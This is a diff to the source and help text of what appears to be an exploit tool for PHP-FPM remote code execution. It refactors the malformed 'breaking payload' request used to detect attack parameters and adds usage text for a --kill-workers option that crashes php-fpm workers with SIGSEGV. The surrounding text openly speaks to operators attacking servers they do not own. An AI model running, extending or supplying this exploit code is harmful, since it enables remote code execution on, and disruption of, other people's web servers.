@@ -6,7 +6,6 @@ import (
 	"log"
 	"os"
 	"sort"
-	"strings"
 )
 
 var errPisosBruteForbidden = errors.New("pisos length brute is forbidden by command line options")
@@ -43,10 +42,9 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 		log.Printf("Skipping qsl detection, using hint (qsl=%v)", hints.QueryStringLength)
 		qslCandidates = append(qslCandidates, hints.QueryStringLength)
 	} else {
-		breakingPayload := "/PHP\n" + strings.Repeat("SOSAT", 10)[:PosOffset-13] + ".php"
 		for qsl := MinQSL; qsl <= MaxQSL; qsl += QSLDetectStep {
 			ap := &AttackParams{qsl, 1}
-			resp, _, err := requester.Request(breakingPayload, ap)
+			resp, _, err := requester.Request(BreakingPayload, ap)
 			if err != nil {
 				return nil, fmt.Errorf("error for %#v: %v", ap, err)
 			}
@@ -150,6 +148,9 @@ config and may seem broken for other users if the detection method is intrusive
 If you have previously retrieved attack params (QSL and Pisos) try to use them
 with --skip-detection. If you manage to get RCE you can fix the server. Another 
 option is to try --reset-setting flag, but I'm not sure it will help.
+
+Another option is to use --kill-workers, this may kill php-fpm workers with SIGSEGV.
+They will restart and the server will become usable again.
 
 If you don't have attack params, used intrusive detection method and don't own the
 server, you are fucked.
